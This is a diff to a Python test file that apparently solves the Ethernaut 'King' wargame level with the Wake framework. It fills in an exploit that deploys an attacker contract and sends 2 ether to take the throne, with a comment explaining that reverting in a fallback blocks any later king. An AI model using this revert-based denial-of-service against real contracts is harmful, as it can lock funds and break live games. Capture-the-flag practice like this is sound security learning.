@@ -1,17 +1,17 @@
 from wake.testing import *
 from tests.ethernaut_deployer import EthernautDeployer
 from pytypes.contracts.lv09_king import King
-# TODO You can import your our own smart contract(s) here.
+from pytypes.contracts.attacker.lv09_eternal_king import EternalKing
 
 @default_chain.connect()
 def test_lv09():
     ethernaut = EthernautDeployer(default_chain)
     contract = ethernaut.deploy_lv09()
-    exploit_lv09(contract)
-    ethernaut.check_lv09(contract)
+    newOwner = exploit_lv09(contract)
+    ethernaut.check_lv09(contract, newOwner)
 
-def exploit_lv09(contract: King):
-    # TODO Became the new king and break the game - no one can claim the kingship from you.
-    # TODO You can import your our own smart contract(s) here.
-    # TODO Code here ...
-    pass
+def exploit_lv09(contract: King) -> Address:
+    # Attack vector: transaction can be reverted inside receive/fallback function
+    attacker = EternalKing.deploy()
+    attacker.bribe(contract.address, value=2 * 10**18)
+    return attacker.address
